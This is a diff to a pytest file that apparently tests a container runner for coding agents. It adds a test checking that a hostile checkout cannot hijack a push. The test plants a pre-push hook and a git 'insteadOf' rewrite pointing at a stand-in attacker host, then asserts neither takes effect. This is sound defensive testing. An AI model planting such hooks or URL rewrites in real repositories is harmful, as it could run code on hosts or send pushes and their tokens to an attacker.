@@ -5,12 +5,9 @@ branch that moved."""
 
 from __future__ import annotations
 
-import json
-
 import pytest
 
-from conftest import CLIError, fake_agent, generic
-from env import ALPINE_IMAGE, wait_until
+from conftest import CLIError, fake_agent
 
 
 def repo_spec(image: str, git_server, prompt: str, *, repo: str = "app", ref: str = "main",
@@ -152,3 +149,25 @@ def commit(lux, run_id: str, host, repo: str, message: str):
     not run git; the test does it inside the container)."""
     host.exec("sh", "-c", f"podman exec --user agent -w /workspace/repos/{repo} lux-{run_id} "
               f"sh -c 'git -c user.email=a@a -c user.name=a commit -qam \"{message}\"'")
+
+
+def test_a_hostile_checkout_cannot_hijack_the_push(lux, runners, hosts, fake_image, git_server):
+    """The workload controls its .git. A pre-push hook and a url rewrite in
+    its config must not run as the runner nor redirect the push (and the
+    token with it): the runner never runs git in the checkout."""
+    git_server.create("hostile", {"a.txt": "base\n"})
+    runners.start(hosts[0])
+    run_id = lux.submit(repo_spec(fake_image, git_server, "write a.txt mine", repo="hostile"))
+    lux.wait_activity(run_id, "idle")
+    commit(lux, run_id, hosts[0], "hostile", "mine")
+    in_container(hosts[0], run_id, "hostile",
+                 "printf '#!/bin/sh\\ntouch /tmp/HOOK-RAN\\n' > .git/hooks/pre-push && chmod +x .git/hooks/pre-push && "
+                 f"git config url.http://attacker.invalid/.insteadOf {git_server.url('hostile')}")
+    out = lux.run("push", run_id, "--wait").stdout
+    assert "pushed" in out, out
+    assert git_server.show("hostile", "lux/work", "a.txt") == "mine\n"
+    assert hosts[0].exec("sh", "-c", "ls /tmp/HOOK-RAN 2>/dev/null; true").strip() == "", "the hook ran on the host"
+
+
+def in_container(host, run_id: str, repo: str, script: str):
+    host.exec("sh", "-c", f"podman exec --user agent -w /workspace/repos/{repo} lux-{run_id} sh -c \"{script}\"")
